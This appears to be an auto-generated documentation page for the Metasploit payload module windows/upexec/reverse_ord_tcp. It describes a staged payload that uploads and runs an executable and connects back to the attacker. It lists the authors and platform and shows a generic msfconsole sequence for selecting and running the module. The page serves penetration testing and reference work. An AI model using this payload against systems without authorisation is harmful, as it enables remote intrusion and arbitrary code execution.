## Windows Upload/Execute, Reverse Ordinal TCP Stager (No NX or Win7)

Uploads an executable and runs it (staged). Connect back to 
the attacker


## Module Name
payload/windows/upexec/reverse_ord_tcp

## Authors
* vlad902
* sf
* spoonm





## Platforms
* win

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/windows/upexec/reverse_ord_tcp
msf payload(reverse_ord_tcp) > show targets
   ... a list of targets ...
msf payload(reverse_ord_tcp) > set TARGET <target-id>
msf payload(reverse_ord_tcp) > show options
   ... show and set options ...
msf payload(reverse_ord_tcp) > run
```
    
    